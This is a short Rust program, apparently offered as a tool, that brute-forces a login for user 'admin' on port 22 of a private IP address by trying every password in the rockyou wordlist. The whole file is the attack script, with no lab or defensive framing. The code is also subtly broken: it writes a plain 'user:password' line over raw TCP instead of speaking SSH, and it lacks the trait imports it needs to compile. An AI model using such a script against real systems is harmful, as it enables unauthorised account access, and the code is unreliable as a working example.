use std::fs::File;
use std::io::{BufRead, BufReader};
use std::net::TcpStream;

fn main() {
    let ip_address = "192.168.1.100";
    let port = 22;
    let username = "admin";
    let mut password = String::new();

    // Open the word list file and iterate over each line
    let file = File::open("rockyou.txt").expect("Failed to open word list file");
    let reader = BufReader::new(file);
    for line in reader.lines() {
        // Try each password in the word list
        password = line.unwrap();
        println!("Trying password: {}", password);
        let success = try_login(ip_address, port, username, &password);
        if success {
            println!("Login successful with password: {}", password);
            break;
        }
    }
}

// Try to log in with the given username and password
fn try_login(ip_address: &str, port: u16, username: &str, password: &str) -> bool {
    let mut stream = TcpStream::connect((ip_address, port)).unwrap();
    let message = format!("{}:{}\n", username, password);
    stream.write(message.as_bytes()).unwrap();
    let mut response = String::new();
    stream.read_to_string(&mut response).unwrap();
    response.contains("Authentication successful")
}
